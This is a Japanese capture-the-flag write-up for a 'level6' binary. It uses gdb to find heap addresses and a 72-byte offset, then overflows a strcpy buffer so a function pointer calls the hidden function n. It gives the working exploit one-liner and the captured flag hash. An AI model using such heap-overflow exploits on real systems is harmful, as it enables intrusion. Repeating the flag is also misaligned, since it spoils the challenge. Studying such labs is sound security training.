# level6

## 方針
strcpyの脆弱性を利用してヒープオーバーフローを引き起こす。
 (**ppcVar1)();で関数ポインタを呼び出している。これを、n関数を呼び出すようにする。
つまり、いい感じの引数を渡して、オーバーフローさせることでn関数のアドレスをppcVar1に入れ呼び出す。

### __destとppcVar1が指してるアドレスを調べるためにmalloc実行後のeaxを確認する。(戻り値はeaxに入る。)
```
(gdb) disas main
....
0x0804848c <+16>:    call   0x8048350 <malloc@plt>
0x08048491 <+21>:    mov    %eax,0x1c(%esp)
0x08048495 <+25>:    movl   $0x4,(%esp)                //ここにbp
0x0804849c <+32>:    call   0x8048350 <malloc@plt>
0x080484a1 <+37>:    mov    %eax,0x18(%esp)
0x080484a5 <+41>:    mov    $0x8048468,%edx           //ここにbp
...

(gdb) b *0x08048495
Breakpoint 1 at 0x8048495
(gdb) b *0x080484a5

(gdb) run a
Starting program: /home/user/level6/level6 a

Breakpoint 1, 0x08048495 in main ()
(gdb) info register
eax            0x804a008        134520840
....
(gdb) next
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x080484a5 in main ()
(gdb) info register
eax            0x804a050        134520912
....
```

上記から__destが0x804a008でppcVar1が0x804a050なのがわかる。

### nのアドレスを調べる
```
(gdb) disass n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
...
```

### ans

ppcVar1までのオフセットが0x50-0x8=0x48(72)だから、72文字後にnの関数アドレスをいれると、
ppcVar1の値をnの関数のアドレスに書き換えられる。

```
./level6 $(python -c "import sys; sys.stdout.write('a' * 72 + '\x54\x84\x04\x08')")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## memo

### gdb外とgdb内でのheapの再現性
スタックは環境変数や引数の影響を受けるから、スタックアドレスがずれる。
だから、gdbとgdb外で行うことは同一条件にできなく再現性がない。
一方、ヒープは環境変数やら引数に影響されないからアドレスの位置が変わらず再現性がある認識

詳しく調べてないからわからん。